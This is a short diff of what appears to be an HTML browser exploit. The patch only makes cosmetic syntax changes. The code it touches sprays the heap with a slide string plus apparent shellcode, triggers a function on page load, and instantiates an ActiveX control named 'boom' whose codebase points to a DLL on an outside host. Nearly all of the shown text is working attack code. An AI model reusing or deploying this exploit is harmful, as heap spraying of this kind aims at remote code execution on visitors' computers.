@@ -39,14 +39,14 @@
   var PLSize = (sCode.length * 2);
   var sSlideSize = heapBS - (PLSize + sizeHDM);
   var heapBlocks = (heapSA+heapBS)/heapBS;
-  var memory = new Array();
+  var memory = [];
   sSlide = getsSlide(sSlide,sSlideSize);
   for (i=0;i<heapBlocks;i++)
    {
     memory[i] = sSlide +  sCode;
    }
  </script>
- <body onload="JavaScript: return tryMe();">
+ <body onload="return tryMe();">
   <object id="boom" classid="clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC" codebase="http://shinnai.net/AudFile.dll">
    Unable to create object
   </object>
